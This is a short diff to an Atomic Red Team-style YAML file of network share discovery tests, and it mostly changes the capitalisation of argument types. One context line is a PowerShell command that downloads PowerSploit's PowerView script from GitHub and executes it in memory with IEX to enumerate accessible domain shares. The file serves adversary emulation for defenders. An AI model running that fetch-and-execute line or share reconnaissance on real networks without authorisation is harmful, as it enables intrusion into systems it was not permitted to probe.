@@ -10,7 +10,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: string
+      type: String
       default: computer1
   executor:
     command: |
@@ -27,11 +27,11 @@ atomic_tests:
   input_arguments:
     package_checker:
       description: Package checking command. Debian - dpkg -s samba
-      type: string
+      type: String
       default: rpm -q samba
     package_installer:
       description: Package installer command. Debian - apt install samba
-      type: string
+      type: String
       default: yum install -y samba
   dependency_executor_name: bash
   dependencies:
@@ -56,7 +56,7 @@ atomic_tests:
   input_arguments:
     computer_name:
       description: Computer name to find a mount on.
-      type: string
+      type: String
       default: localhost
   executor:
     command: |
@@ -101,4 +101,3 @@ atomic_tests:
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-DomainShare -CheckShareAccess -Verbose
     name: powershell
-
